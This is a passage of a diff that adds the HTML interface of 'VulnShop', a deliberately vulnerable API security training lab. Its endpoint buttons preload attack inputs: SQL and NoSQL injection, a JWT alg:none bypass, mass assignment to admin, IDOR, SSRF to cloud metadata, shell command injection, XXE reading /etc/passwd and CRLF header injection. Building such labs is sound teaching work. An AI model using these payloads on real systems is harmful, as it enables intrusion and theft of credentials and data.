@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VulnShop — Interactive Security Lab</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #060910; --surface: #0d1117; --surface2: #161b22; --surface3: #1c2333;
+  --border: #21262d; --border2: #30363d;
+  --accent: #ef4444; --accent2: #f97316; --accent3: #fbbf24;
+  --green: #22c55e; --blue: #3b82f6; --purple: #8b5cf6; --cyan: #06b6d4;
+  --pink: #ec4899;
+  --text: #e2e8f0; --text2: #94a3b8; --text3: #64748b;
+  --critical: #ef4444; --high: #f97316; --medium: #fbbf24; --low: #3b82f6; --info: #6b7280;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
+
+/* ── Scrollbar ── */
+::-webkit-scrollbar{width:6px;height:6px;}
+::-webkit-scrollbar-track{background:var(--surface);}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px;}
+::-webkit-scrollbar-thumb:hover{background:#4b5563;}
+
+/* ── Header ── */
+.header{
+  background:linear-gradient(135deg,#0d0000 0%,#060910 60%,#000d1a 100%);
+  border-bottom:1px solid rgba(239,68,68,.15);
+  padding:0 2rem;
+  height:60px;
+  display:flex;align-items:center;gap:1rem;
+  position:sticky;top:0;z-index:100;
+  backdrop-filter:blur(12px);
+}
+.header-logo{display:flex;align-items:center;gap:.7rem;}
+.logo-dot{width:10px;height:10px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:blink 1.5s ease-in-out infinite;}
+@keyframes blink{0%,100%{opacity:1;box-shadow:0 0 8px var(--accent);}50%{opacity:.4;box-shadow:0 0 2px var(--accent);}}
+.header-title{font-size:1.15rem;font-weight:700;background:linear-gradient(90deg,#ef4444,#f97316);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.header-sub{font-size:.72rem;color:var(--text3);margin-top:.05rem;}
+.header-spacer{flex:1;}
+.warn-badge{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.25);color:#ef4444;padding:.3rem .9rem;border-radius:20px;font-size:.7rem;font-weight:700;letter-spacing:.03em;animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{opacity:1;}50%{opacity:.6;}}
+.server-status{display:flex;align-items:center;gap:.4rem;font-size:.75rem;color:var(--text3);margin-left:1rem;cursor:pointer;}
+.status-dot{width:8px;height:8px;border-radius:50%;background:#374151;}
+.status-dot.online{background:var(--green);box-shadow:0 0 6px var(--green);}
+.status-dot.offline{background:var(--accent);}
+
+/* ── Layout ── */
+.layout{display:grid;grid-template-columns:290px 1fr 310px;height:calc(100vh - 60px);}
+.sidebar{background:var(--surface);border-right:1px solid var(--border);overflow-y:auto;display:flex;flex-direction:column;}
+.main{overflow-y:auto;background:var(--bg);}
+.rightpanel{background:var(--surface);border-left:1px solid var(--border);overflow-y:auto;display:flex;flex-direction:column;}
+
+/* ── Sidebar ── */
+.sidebar-section{padding:.8rem 1rem .4rem;}
+.sidebar-label{font-size:.65rem;font-weight:700;color:var(--text3);letter-spacing:.1em;text-transform:uppercase;padding:.4rem 0 .5rem;display:flex;align-items:center;gap:.4rem;}
+.sidebar-label::after{content:'';flex:1;height:1px;background:var(--border);}
+.ep-btn{
+  width:100%;background:transparent;border:1px solid transparent;border-radius:8px;
+  padding:.55rem .8rem;cursor:pointer;display:flex;align-items:center;gap:.6rem;
+  transition:all .15s;text-align:left;margin-bottom:2px;
+}
+.ep-btn:hover{background:rgba(239,68,68,.05);border-color:rgba(239,68,68,.2);}
+.ep-btn.active{background:rgba(239,68,68,.1);border-color:rgba(239,68,68,.4);}
+.method-badge{font-size:.6rem;font-weight:700;padding:.2rem .45rem;border-radius:4px;min-width:40px;text-align:center;font-family:'JetBrains Mono',monospace;flex-shrink:0;}
+.GET   {background:rgba(34,197,94,.12);color:#22c55e;border:1px solid rgba(34,197,94,.25);}
+.POST  {background:rgba(59,130,246,.12);color:#60a5fa;border:1px solid rgba(59,130,246,.25);}
+.PUT   {background:rgba(251,191,36,.12);color:#fbbf24;border:1px solid rgba(251,191,36,.25);}
+.DELETE{background:rgba(239,68,68,.12);color:#ef4444;border:1px solid rgba(239,68,68,.25);}
+.ep-path{font-size:.75rem;font-family:'JetBrains Mono',monospace;color:var(--text2);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.vuln-chip{font-size:.58rem;font-weight:700;padding:.15rem .35rem;border-radius:3px;flex-shrink:0;}
+.chip-critical{background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.2);}
+.chip-high    {background:rgba(249,115,22,.15);color:#f97316;border:1px solid rgba(249,115,22,.2);}
+.chip-medium  {background:rgba(251,191,36,.15);color:#fbbf24;border:1px solid rgba(251,191,36,.2);}
+.chip-low     {background:rgba(59,130,246,.15);color:#60a5fa;border:1px solid rgba(59,130,246,.2);}
+
+/* ── Tabs (main area) ── */
+.tabs-bar{display:flex;gap:0;border-bottom:1px solid var(--border);background:var(--surface);padding:0 1.5rem;position:sticky;top:0;z-index:10;}
+.tab-btn{background:transparent;border:none;color:var(--text3);padding:.9rem 1.2rem;font-size:.82rem;font-weight:500;cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;font-family:'Inter',sans-serif;}
+.tab-btn:hover{color:var(--text);}
+.tab-btn.active{color:var(--accent);border-bottom-color:var(--accent);}
+.tab-content{display:none;padding:1.5rem;}
+.tab-content.active{display:block;}
+
+/* ── Request Builder ── */
+.section-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:1rem;}
+.card-header{padding:.8rem 1.2rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:.8rem;background:var(--surface2);}
+.card-title{font-size:.82rem;font-weight:600;color:var(--text);}
+.card-body{padding:1rem 1.2rem;}
+
+.url-row{display:flex;gap:.5rem;align-items:center;}
+select.method-sel{
+  background:var(--surface2);border:1px solid var(--border2);border-radius:8px;
+  padding:.55rem .7rem;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.82rem;
+  outline:none;cursor:pointer;
+}
+.url-input{
+  flex:1;background:var(--surface2);border:1px solid var(--border2);border-radius:8px;
+  padding:.55rem .9rem;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.82rem;
+  outline:none;transition:border-color .15s;
+}
+.url-input:focus{border-color:var(--accent);}
+.send-btn{
+  background:var(--accent);color:#fff;border:none;border-radius:8px;
+  padding:.55rem 1.3rem;font-weight:700;font-size:.82rem;cursor:pointer;
+  transition:all .2s;white-space:nowrap;display:flex;align-items:center;gap:.4rem;
+}
+.send-btn:hover{background:#dc2626;transform:scale(1.02);}
+.send-btn:disabled{opacity:.5;cursor:not-allowed;transform:none;}
+
+.params-grid{display:grid;grid-template-columns:1fr 1fr;gap:.6rem;margin-top:.8rem;}
+.input-label{font-size:.7rem;color:var(--text3);margin-bottom:.25rem;font-weight:500;}
+input[type="text"],input[type="password"],textarea{
+  width:100%;background:var(--surface2);border:1px solid var(--border2);border-radius:7px;
+  padding:.5rem .8rem;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.78rem;
+  outline:none;transition:border-color .15s;
+}
+input[type="text"]:focus,input[type="password"]:focus,textarea:focus{border-color:var(--cyan);}
+textarea{resize:vertical;min-height:90px;}
+
+.auth-row{display:flex;gap:.5rem;align-items:center;margin-top:.8rem;}
+.auto-login-btn{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.25);color:var(--green);border-radius:7px;padding:.45rem .8rem;cursor:pointer;font-size:.75rem;font-weight:600;white-space:nowrap;transition:all .15s;}
+.auto-login-btn:hover{background:rgba(34,197,94,.2);}
+
+/* ── Payload Snippets ── */
+.payload-grid{display:flex;flex-wrap:wrap;gap:.4rem;margin-top:.6rem;}
+.payload-chip{
+  background:var(--surface3);border:1px solid var(--border2);border-radius:6px;
+  padding:.3rem .65rem;font-size:.7rem;font-family:'JetBrains Mono',monospace;color:var(--cyan);
+  cursor:pointer;transition:all .15s;
+}
+.payload-chip:hover{background:rgba(6,182,212,.1);border-color:rgba(6,182,212,.3);}
+.payload-chip.danger{color:#f97316;border-color:rgba(249,115,22,.2);}
+.payload-chip.danger:hover{background:rgba(249,115,22,.1);border-color:rgba(249,115,22,.4);}
+
+/* ── Response Panel ── */
+.response-meta{display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;}
+.status-pill{padding:.25rem .65rem;border-radius:20px;font-size:.72rem;font-weight:700;font-family:'JetBrains Mono',monospace;}
+.s-2xx{background:rgba(34,197,94,.12);color:#22c55e;border:1px solid rgba(34,197,94,.25);}
+.s-4xx{background:rgba(251,191,36,.12);color:#fbbf24;border:1px solid rgba(251,191,36,.25);}
+.s-5xx{background:rgba(239,68,68,.12);color:#ef4444;border:1px solid rgba(239,68,68,.25);}
+.time-badge{font-size:.72rem;color:var(--text3);font-family:'JetBrains Mono',monospace;}
+.size-badge{font-size:.72rem;color:var(--text3);font-family:'JetBrains Mono',monospace;}
+
+.resp-tabs{display:flex;gap:0;border-bottom:1px solid var(--border);margin-bottom:.8rem;}
+.resp-tab{background:transparent;border:none;color:var(--text3);padding:.5rem .9rem;font-size:.75rem;cursor:pointer;border-bottom:2px solid transparent;font-family:'Inter',sans-serif;}
+.resp-tab.active{color:var(--cyan);border-bottom-color:var(--cyan);}
+.resp-body{max-height:380px;overflow-y:auto;}
+pre.json-out{font-family:'JetBrains Mono',monospace;font-size:.77rem;line-height:1.7;white-space:pre-wrap;word-break:break-all;}
+.json-key{color:#79c0ff;}
+.json-str{color:#a5f3a1;}
+.json-num{color:#f8c555;}
+.json-bool{color:#ff7b72;}
+.json-null{color:#6e7681;}
+.copy-resp-btn{background:var(--surface3);border:1px solid var(--border2);color:var(--text3);border-radius:6px;padding:.3rem .7rem;font-size:.72rem;cursor:pointer;transition:all .15s;margin-left:auto;}
+.copy-resp-btn:hover{background:var(--border2);color:var(--text);}
+
+/* ── Vuln Banner ── */
+.vuln-banner{border-radius:10px;padding:.9rem 1.2rem;margin-bottom:1rem;display:flex;align-items:flex-start;gap:.8rem;}
+.vuln-banner.critical{background:rgba(239,68,68,.07);border:1px solid rgba(239,68,68,.25);}
+.vuln-banner.high    {background:rgba(249,115,22,.07);border:1px solid rgba(249,115,22,.25);}
+.vuln-banner.medium  {background:rgba(251,191,36,.07);border:1px solid rgba(251,191,36,.25);}
+.vuln-banner.low     {background:rgba(59,130,246,.07);border:1px solid rgba(59,130,246,.25);}
+.vuln-banner.info    {background:rgba(99,102,241,.07);border:1px solid rgba(99,102,241,.25);}
+.vuln-icon{font-size:1.4rem;line-height:1;}
+.vuln-detail{}
+.vuln-title{font-size:.83rem;font-weight:700;color:var(--text);margin-bottom:.25rem;}
+.vuln-desc{font-size:.78rem;color:var(--text2);line-height:1.6;}
+.vuln-owasp{display:inline-block;margin-top:.4rem;font-size:.68rem;font-weight:700;padding:.2rem .5rem;border-radius:4px;background:rgba(139,92,246,.15);color:#a78bfa;border:1px solid rgba(139,92,246,.2);}
+
+/* ── Detection Alert ── */
+.detection-alert{
+  background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.35);
+  border-radius:10px;padding:.8rem 1.2rem;margin-top:.8rem;
+  display:flex;align-items:center;gap:.7rem;font-size:.8rem;
+  animation:fadein .4s ease;
+}
+@keyframes fadein{from{opacity:0;transform:translateY(-6px);}to{opacity:1;transform:translateY(0);}}
+.detection-icon{font-size:1.3rem;}
+.detection-text{color:var(--accent);}
+
+/* ── History Tab ── */
+.history-item{
+  background:var(--surface2);border:1px solid var(--border);border-radius:9px;
+  padding:.75rem 1rem;margin-bottom:.5rem;cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:.8rem;
+}
+.history-item:hover{border-color:var(--border2);background:var(--surface3);}
+.hist-method{font-size:.65rem;font-weight:700;padding:.2rem .45rem;border-radius:4px;font-family:'JetBrains Mono',monospace;flex-shrink:0;}
+.hist-path{flex:1;font-size:.77rem;font-family:'JetBrains Mono',monospace;color:var(--text2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.hist-status{font-size:.7rem;font-family:'JetBrains Mono',monospace;}
+.hist-time{font-size:.68rem;color:var(--text3);}
+.clear-hist-btn{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:var(--accent);border-radius:7px;padding:.4rem .9rem;cursor:pointer;font-size:.75rem;font-weight:600;transition:all .15s;margin-bottom:.8rem;}
+.clear-hist-btn:hover{background:rgba(239,68,68,.2);}
+
+/* ── OWASP Map ── */
+.owasp-grid{display:grid;grid-template-columns:1fr 1fr;gap:.6rem;}
+.owasp-card{
+  background:var(--surface2);border:1px solid var(--border);border-radius:10px;
+  padding:.8rem 1rem;cursor:pointer;transition:all .15s;
+}
+.owasp-card:hover{border-color:var(--border2);transform:translateY(-1px);}
+.owasp-card.tested{border-color:rgba(34,197,94,.3);background:rgba(34,197,94,.04);}
+.owasp-id{font-size:.65rem;font-weight:800;color:var(--accent);font-family:'JetBrains Mono',monospace;}
+.owasp-name{font-size:.75rem;font-weight:600;color:var(--text);margin:.2rem 0;}
+.owasp-status{font-size:.65rem;color:var(--text3);display:flex;align-items:center;gap:.3rem;margin-top:.3rem;}
+.dot-tested{width:6px;height:6px;border-radius:50%;background:var(--green);}
+.dot-untested{width:6px;height:6px;border-radius:50%;background:var(--text3);}
+
+/* ── Right Panel ── */
+.rp-section{padding:.9rem 1rem;border-bottom:1px solid var(--border);}
+.rp-title{font-size:.72rem;font-weight:700;color:var(--text3);letter-spacing:.08em;text-transform:uppercase;margin-bottom:.7rem;}
+.token-box{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:.6rem .8rem;font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--green);word-break:break-all;max-height:80px;overflow:auto;cursor:pointer;}
+.token-box.empty{color:var(--text3);}
+.token-actions{display:flex;gap:.4rem;margin-top:.5rem;}
+.t-btn{flex:1;background:var(--surface3);border:1px solid var(--border2);color:var(--text2);border-radius:6px;padding:.35rem .5rem;font-size:.7rem;cursor:pointer;transition:all .15s;text-align:center;}
+.t-btn:hover{background:var(--border2);color:var(--text);}
+.t-btn.danger{color:var(--accent);border-color:rgba(239,68,68,.2);}
+.t-btn.danger:hover{background:rgba(239,68,68,.1);}
+
+.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:.5rem;}
+.stat-mini{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:.6rem .8rem;text-align:center;}
+.stat-num{font-size:1.4rem;font-weight:800;line-height:1.1;}
+.stat-lbl{font-size:.62rem;color:var(--text3);text-transform:uppercase;letter-spacing:.05em;margin-top:.15rem;}
+.c-red{color:var(--critical);} .c-orange{color:var(--high);} .c-yellow{color:var(--medium);} .c-blue{color:var(--low);}
+
+.attack-chain{display:flex;flex-direction:column;gap:.4rem;}
+.chain-step{
+  background:var(--surface2);border:1px solid var(--border);border-radius:8px;
+  padding:.6rem .8rem;display:flex;align-items:center;gap:.6rem;cursor:pointer;transition:all .15s;
+}
+.chain-step:hover{border-color:var(--purple);background:rgba(139,92,246,.05);}
+.chain-num{width:20px;height:20px;border-radius:50%;background:rgba(139,92,246,.2);color:#a78bfa;font-size:.65rem;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.chain-info{flex:1;}
+.chain-name{font-size:.75rem;font-weight:600;color:var(--text);}
+.chain-desc{font-size:.67rem;color:var(--text3);margin-top:.1rem;}
+.chain-btn{font-size:.65rem;background:rgba(139,92,246,.15);color:#a78bfa;border:1px solid rgba(139,92,246,.25);border-radius:5px;padding:.2rem .5rem;cursor:pointer;}
+
+/* ── Loading ── */
+.spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:spin .5s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+
+/* ── Scan CTA ── */
+.scan-cta{
+  background:linear-gradient(135deg,rgba(139,92,246,.1),rgba(239,68,68,.07));
+  border:1px solid rgba(139,92,246,.25);border-radius:12px;padding:1rem 1.2rem;
+  display:flex;align-items:center;gap:1rem;margin-bottom:1rem;
+}
+.cta-info{flex:1;}
+.cta-title{font-size:.85rem;font-weight:700;color:var(--text);margin-bottom:.3rem;}
+.cta-cmd{font-family:'JetBrains Mono',monospace;font-size:.73rem;color:#a3e635;background:rgba(0,0,0,.4);padding:.4rem .7rem;border-radius:6px;display:inline-block;}
+.copy-cmd-btn{background:var(--purple);color:#fff;border:none;border-radius:8px;padding:.5rem .9rem;cursor:pointer;font-size:.75rem;font-weight:700;transition:all .2s;white-space:nowrap;}
+.copy-cmd-btn:hover{background:#7c3aed;}
+
+/* ── JWT Decoder ── */
+.jwt-section{display:flex;flex-direction:column;gap:.5rem;}
+.jwt-part{background:var(--surface2);border-radius:7px;padding:.5rem .8rem;}
+.jwt-part-title{font-size:.65rem;font-weight:700;margin-bottom:.3rem;}
+.jwt-part.header-part .jwt-part-title{color:#60a5fa;}
+.jwt-part.payload-part .jwt-part-title{color:#22c55e;}
+.jwt-part.sig-part .jwt-part-title{color:#f87171;}
+pre.jwt-pre{font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--text2);white-space:pre-wrap;}
+
+/* ── Responsive hint ── */
+@media(max-width:1200px){
+  .layout{grid-template-columns:260px 1fr 280px;}
+}
+</style>
+</head>
+<body>
+
+<!-- ─── HEADER ─── -->
+<div class="header">
+  <div class="header-logo">
+    <div class="logo-dot"></div>
+    <div>
+      <div class="header-title">VulnShop — Security Lab</div>
+      <div class="header-sub">Deliberately Vulnerable API · OWASP API Top 10</div>
+    </div>
+  </div>
+  <div class="header-spacer"></div>
+  <div class="server-status" onclick="checkServer()" title="Click to check server">
+    <div class="status-dot" id="srv-dot"></div>
+    <span id="srv-label">Checking...</span>
+  </div>
+  <a href="http://localhost:8501" target="_blank" style="
+    display:flex;align-items:center;gap:.5rem;
+    background:linear-gradient(135deg,rgba(99,102,241,.18),rgba(139,92,246,.12));
+    border:1px solid rgba(99,102,241,.35);border-radius:8px;
+    padding:.35rem .9rem;text-decoration:none;transition:all .2s;
+    color:#a5b4fc;font-size:.75rem;font-weight:700;white-space:nowrap;
+    margin-right:.5rem;
+  " onmouseover="this.style.borderColor='rgba(99,102,241,.7)'" onmouseout="this.style.borderColor='rgba(99,102,241,.35)'">
+    🦅 CyberHawk Dashboard ↗
+  </a>
+  <div class="warn-badge">⚠ FOR TESTING ONLY</div>
+</div>
+
+<!-- ─── LAYOUT ─── -->
+<div class="layout">
+
+  <!-- ──────── LEFT SIDEBAR ──────── -->
+  <div class="sidebar">
+
+    <div class="sidebar-section">
+      <div class="stats-grid">
+        <div class="stat-mini"><div class="stat-num c-red" id="s-critical">0</div><div class="stat-lbl">Critical</div></div>
+        <div class="stat-mini"><div class="stat-num c-orange" id="s-high">0</div><div class="stat-lbl">High</div></div>
+        <div class="stat-mini"><div class="stat-num c-yellow" id="s-reqs">0</div><div class="stat-lbl">Requests</div></div>
+        <div class="stat-mini"><div class="stat-num c-blue" id="s-vulns">0</div><div class="stat-lbl">Confirmed</div></div>
+      </div>
+    </div>
+
+    <div class="sidebar-section" style="flex:1;padding-top:.3rem;">
+
+      <div class="sidebar-label">🔑 Authentication</div>
+      <button class="ep-btn" onclick="loadEp(this,'POST','/api/login','{\n  "username": "admin",\n  "password": "admin"\n}','Broken Authentication','Use weak credentials (admin/admin). Also try NoSQL bypass: set password to {"$gt":""} or use JWT alg:none.','critical','API2')">
+        <span class="method-badge POST">POST</span><span class="ep-path">/api/login</span><span class="vuln-chip chip-critical">API2</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'POST','/api/register','{\n  "username": "hacker",\n  "email": "h@x.com",\n  "password": "pass",\n  "role": "admin",\n  "isAdmin": true,\n  "balance": 999999\n}','Mass Assignment via Registration','Any field sent in register body is accepted: role, isAdmin, balance, verified, permissions. Register yourself as admin!','high','API3')">
+        <span class="method-badge POST">POST</span><span class="ep-path">/api/register</span><span class="vuln-chip chip-high">API3</span>
+      </button>
+
+      <div class="sidebar-label">👤 Users / IDOR</div>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/users/1','','BOLA / IDOR — Broken Object Level Authorization','No authorization check! Change the ID to 2 or 3 to access other users\' full profile including credit cards.','critical','API1')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/users/1</span><span class="vuln-chip chip-critical">API1</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/users','','BFLA — Any User Can List All Users','Any authenticated user (not just admin) can call this endpoint and get all user data.','high','API5')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/users</span><span class="vuln-chip chip-high">API5</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/me','','Current User Profile','Returns your own profile. Compare with direct IDOR above.','low','API1')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/me</span><span class="vuln-chip chip-low">INFO</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'PUT','/api/users/2','{\n  "role": "admin",\n  "balance": 99999,\n  "password": "hacked"\n}','IDOR + Mass Assignment on Update','No ownership check. Update another user\'s role, balance or password directly.','critical','API1')">
+        <span class="method-badge PUT">PUT</span><span class="ep-path">/api/users/2</span><span class="vuln-chip chip-critical">API1</span>
+      </button>
+
+      <div class="sidebar-label">🛍 Products / SQLi</div>
+      <button class="ep-btn" onclick="loadEp(this,'GET',\"/api/products?search=' OR '1'='1\",'','SQL Injection in Search Parameter','The search param is passed unsanitized. Try: \'OR\'1\'=\'1, UNION SELECT, SLEEP(4), 1=1--','critical','API3')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/products?search=</span><span class="vuln-chip chip-critical">SQLi</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/products','','All Products (No Auth)','Products are publicly accessible with no authentication required.','low','API9')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/products</span><span class="vuln-chip chip-low">API9</span>
+      </button>
+
+      <div class="sidebar-label">📦 Orders</div>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/orders/1','','IDOR — Access Other Users Orders','Order ID 1 belongs to alice (user 2). You can access it as any authenticated user.','critical','API1')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/orders/1</span><span class="vuln-chip chip-critical">API1</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'POST','/api/orders','{\n  "product": "Free Item",\n  "quantity": -1,\n  "amount": -100\n}','Business Logic — Negative Amounts Accepted','No input validation on quantity or amount. Submit negative values to potentially credit your account.','high','API6')">
+        <span class="method-badge POST">POST</span><span class="ep-path">/api/orders</span><span class="vuln-chip chip-high">API6</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/orders','','IDOR — List ALL Orders','Returns every order in the system regardless of who made them.','high','API1')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/orders</span><span class="vuln-chip chip-high">API1</span>
+      </button>
+
+      <div class="sidebar-label">⚙ Admin — BFLA</div>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/admin/users','','BFLA — Admin Endpoint Without Role Check','Any authenticated user can access this. Returns ALL users including plaintext passwords and credit cards!','critical','API5')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/admin/users</span><span class="vuln-chip chip-critical">API5</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/admin/config','','Config Leak — JWT Secret + DB Creds','Returns the JWT signing secret, database password, Stripe key and SMTP credentials.','critical','API5')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/admin/config</span><span class="vuln-chip chip-critical">API5</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/admin/logs','','Admin Logs (Any User)','Returns detailed system logs with IPs and payment card data.','high','API5')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/admin/logs</span><span class="vuln-chip chip-high">API5</span>
+      </button>
+
+      <div class="sidebar-label">🌐 Injection / SSRF</div>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/fetch?url=http://169.254.169.254/latest/meta-data/','','SSRF — Server-Side Request Forgery','No URL validation. Fetch internal services, cloud metadata endpoints, Redis, etc.','critical','API7')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/fetch?url=</span><span class="vuln-chip chip-critical">API7</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/ping?host=localhost;id','','OS Command Injection (Simulated)','Semicolons/pipes/backticks are injected into a shell command. Simulated output returned.','critical','API3')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/ping?host=</span><span class="vuln-chip chip-critical">CMDi</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'POST','/api/import','<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>','XXE — XML External Entity Injection','Send XML with SYSTEM entity pointing to local files or internal services.','critical','API3')">
+        <span class="method-badge POST">POST</span><span class="ep-path">/api/import</span><span class="vuln-chip chip-critical">XXE</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/redirect?url=https://evil.com%0d%0aSet-Cookie:+admin=true','','CRLF Injection Header Splitting','\\r\\n in the URL parameter splits HTTP headers and injects arbitrary cookies.','high','API3')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/redirect</span><span class="vuln-chip chip-high">CRLF</span>
+      </button>
+
+      <div class="sidebar-label">📄 Info Disclosure</div>
+      <button class="ep-btn" onclick="loadEp(this,'POST','/graphql','{"query":"{__schema{types{name fields{name}}}}"}','GraphQL Introspection Enabled','Full schema exposed including User.password and creditCard fields. Also reveals mutations.','medium','API9')">
+        <span class="method-badge POST">POST</span><span class="ep-path">/graphql</span><span class="vuln-chip chip-medium">API9</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/.env','','Environment File Exposed','Leaks JWT_SECRET, DB_PASSWORD, AWS keys, Stripe secret key in plaintext.','critical','API9')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/.env</span><span class="vuln-chip chip-critical">API9</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/swagger.json','','OpenAPI Spec Exposed','Reveals all endpoints, parameters and authentication schemes.','medium','API9')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/swagger.json</span><span class="vuln-chip chip-medium">API9</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/jwks.json','','JWKS Exposed — Algorithm Confusion','Public key exposed for RS256→HS256 algorithm confusion attack.','high','API2')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/jwks.json</span><span class="vuln-chip chip-high">API2</span>
+      </button>
+      <button class="ep-btn" onclick="loadEp(this,'GET','/api/health','','Health Endpoint Info Leak','Reveals DB URL, internal IP, environment, debug mode.','low','API8')">
+        <span class="method-badge GET">GET</span><span class="ep-path">/api/health</span><span class="vuln-chip chip-low">API8</span>
+      </button>
+
+      <div class="sidebar-label">💥 Rate Limiting</div>
+      <button class="ep-btn" onclick="loadEp(this,'POST','/api/coupon','{"code":"SAVE50"}','Coupon Reuse — No Rate Limiting','Same coupon can be applied unlimited times. API4: no rate limit, no per-user tracking.','medium','API4')">
+        <span class="method-badge POST">POST</span><span class="ep-path">/api/coupon</span><span class="vuln-chip chip-medium">API4</span>
+      </button>
+
+    </div>
+  </div>
+
+  <!-- ──────── MAIN AREA ──────── -->
+  <div class="main">
+    <div class="tabs-bar">
+      <button class="tab-btn active" onclick="switchTab('request',this)">⚡ Request Builder</button>
+      <button class="tab-btn" onclick="switchTab('history',this)">📜 History</button>
+      <button class="tab-btn" onclick="switchTab('owasp',this)">🗺 OWASP Map</button>
+      <button class="tab-btn" onclick="switchTab('jwt',this)">🔐 JWT Lab</button>
+    </div>
+
+    <!-- REQUEST BUILDER TAB -->
+    <div class="tab-content active" id="tab-request">
+
+      <div class="scan-cta">
+        <div class="cta-info">
+          <div class="cta-title">🦅 Auto-scan with CyberHawk</div>
+          <div class="cta-cmd" id="scan-cmd">python -m backend.cli ai-scan http://localhost:5001 "full security scan" -p longcat</div>
+        </div>
+        <button class="copy-cmd-btn" onclick="copyCmd()">📋 Copy</button>
+      </div>
+
+      <!-- Vuln Banner -->
+      <div class="vuln-banner info" id="vuln-banner">
+        <div class="vuln-icon">ℹ️</div>
+        <div class="vuln-detail">
+          <div class="vuln-title">Select an endpoint from the sidebar</div>
+          <div class="vuln-desc">Each endpoint contains at least one OWASP API Security Top 10 vulnerability. Click an endpoint to load it, then fire the request to confirm the vulnerability.</div>
+        </div>
+      </div>
+
+      <!-- Detection Alert (hidden until triggered) -->
+      <div class="detection-alert" id="detection-alert" style="display:none;">
+        <div class="detection-icon">💥</div>
+        <div class="detection-text" id="detection-text"></div>
+      </div>
+
+      <!-- Request Panel -->
+      <div class="section-card">
+        <div class="card-header">
+          <span class="method-badge GET" id="req-badge">GET</span>
+          <span class="card-title">HTTP Request</span>
+          <div id="loading" style="display:none;align-items:center;gap:.4rem;margin-left:auto;font-size:.75rem;color:var(--text3);">
+            <div class="spinner"></div> Sending...
+          </div>
+        </div>
+        <div class="card-body">
+          <div class="url-row">
+            <select class="method-sel" id="method-sel" onchange="onMethodChange()">
+              <option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>OPTIONS</option>
+            </select>
